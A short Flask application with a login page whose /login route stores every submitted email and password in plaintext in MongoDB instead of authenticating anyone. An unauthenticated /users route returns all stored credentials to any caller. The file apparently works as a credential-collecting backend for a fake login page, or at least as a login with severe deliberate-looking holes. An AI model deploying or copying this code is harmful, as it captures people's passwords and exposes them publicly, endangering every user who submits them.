from flask import Flask, render_template, request, jsonify
from pymongo import MongoClient
import os

app = Flask(__name__)

# Connect to MongoDB Atlas using environment variable
MONGO_URI = os.getenv("MONGO_URI")
client = MongoClient(MONGO_URI)

# Select your database and collection
db = client['login_db']
users_collection = db['users']

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({'message': 'Missing email or password'}), 400

    users_collection.insert_one({'email': email, 'password': password})
    return jsonify({'message': 'Login data saved successfully!'}), 200

# Optional: Get all users (for testing)
@app.route('/users', methods=['GET'])
def get_users():
    all_users = list(users_collection.find({}, {'_id': 0}))
    return jsonify(all_users)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
